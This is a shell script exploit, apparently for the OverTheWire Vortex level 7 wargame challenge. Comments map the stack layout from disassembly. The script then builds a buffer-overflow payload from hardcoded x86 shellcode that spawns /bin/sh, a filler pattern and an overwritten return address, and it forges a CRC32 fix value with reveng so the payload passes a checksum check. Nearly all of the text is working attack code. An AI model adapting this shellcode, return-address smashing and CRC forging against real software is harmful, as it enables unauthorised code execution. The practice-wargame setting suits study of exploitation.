#!/bin/sh

set -e
set -u
# Over the Wire Vortex7 Exploit
# Needs reveng - http://reveng.sourceforge.net/ (https://github.com/berney/reveng)
# Needs radare2

#
#; arg int argv @ ebp+0xc
#; var int local_buf @ esp+0x12
#
# 0x080484c1      55                         push ebp                   ; esp2 = esp1 - 4
# 0x080484c2      89e5                       ebp = esp			; ebp = esp2
# 0x080484c4      83e4f0                     esp &= 0xfffffff0		; esp3 = esp2 & 0xffffff0
# 0x080484c7      83ec50                     esp -= 0x50     ; 'P'
#
# VAR(0x00..0x0f) + 0x50 - 0x12 + 8 == Saved Return Address
# VAR(0x00..0x0f) + 0x50 - 0x12 + 4 == Saved EBP
#
#                          +----------------------+
#          call         4  | Saved Return Address | <-- esp0
#                          +----------------------+
#          push ebp     4  | Saved EBP            | <-- esp1 = esp0 - 4
#   ^                      +----------------------+
#   .   variable 0x00..0F  | Align Pad 0x00..0x0F | <-- esp2 = esp1 - 4           <-- ebp
#   .          ^           +----------------------+
#   .          .           |                      | <-- esp3 = esp2 & 0xfffffff0
#   .          .           |                      |
#   Y          .           |                      |
#   .          .     0x3e  |                      |
#   .          X           |                      |
#   .          .           | buf                  | <-- buf = esp4 + 0x12 
#   v          .           +----------------------+
#              .           |                      |
#              .     0x12  |                      |
#              .           |                      | <-- esp4 = esp3 - 0x50
#              v           +----------------------+
#
# buf = esp4 + 0x12
#     = esp3 - 0x50 + 0x12
#     = esp2 & 0xfffffff0 - 0x50 + 0x12
#     = (esp1 - 4) & 0xfffffff0 - 0x50 + 0x12
#
# X   = 0x50 = 80
# Y   = 0x3e + var(0x0..0f) = 0x3e..0x4d = 62..77
#
#
# Shellcode + FixCRC + Pattern + BUF_ADDR
# =   24    + 4      +   50    + 4        =   82
# = 0x18    + 4      + 0x32    + 4        = 0x52
#


#SHELLCODE="$(ragg2  -b 32  -i exec)"
SHELLCODE=31c050682f2f7368682f62696e89e3505389e199b00bcd80
SHELLCODE_LEN=24

PATTERN_LEN=50 # Debug here, EIP should be in Pattern
PATTERN_LEN=46 # Exploit here, EIP should be start of our buf (shellcode)
PATTERN=$(ragg2 -P $PATTERN_LEN)

#
# Found by matching extracted CRC32 table
# - Also by experimentation
# - also by searchig wtih `reveng`
#
POLY=04c11db7
REVENG_OPTS="-l -i 0 -x 0"

# reversed endian
TARGET_CRC=ee95cae1 # 0xe1ca95ee

#
# The CRC of this will give our target CRC
# - We will calculate this
#
FIX_CRC=41414141

#
# The beginning of the buf on the stack, which contains our shellcode
# - we will smash the stack and overwrite main's saved return address with this value
# - reversed endian
#
BUF_ADDR=42d6ffff # 0xffffd642
BUF_ADDR=e2ddffff # 0xffffdde2

msg() {
    echo "$@"
}

die() {
    echo "$@"
    exit 1
}

#msg "Vortex 7 exploit"

FRONT="${SHELLCODE}"
BACK="${PATTERN}${BUF_ADDR}"
#msg "front:$FRONT back:$BACK"

FWD_CRC="$(reveng -w 32 -p $POLY $REVENG_OPTS -c $FRONT)"
REV_CRC="$(reveng -w 32 -p $POLY $REVENG_OPTS -v ${BACK}${TARGET_CRC})"

# Xor the fwd and rev crc to get the fix value
FIX_CRC=$(reveng -w 32 -p 00000001 -c "${FWD_CRC}${REV_CRC}")
HEX_STR="${FRONT}${FIX_CRC}${BACK}"
msg $HEX_STR
TEST_CRC=$(reveng -w 32 -p $POLY $REVENG_OPTS -c $HEX_STR)
#msg "fwd:$FWD_CRC rev:$REV_CRC fix:$FIX_CRC test:$TEST_CRC"
if [ "$TEST_CRC" != "$TARGET_CRC" ]; then
	die "Test crc $TEST_CRC != Target CRC $TARGET_CRC"
fi

#C_STR=$(echo $HEX_STR | sed -e 's/\(..\)/\\x\1/g')
#ASCII_STR=$(python -c "print('{!r}'.format('${HEX_STR}'.decode('hex')))")
#msg $ASCII_STR
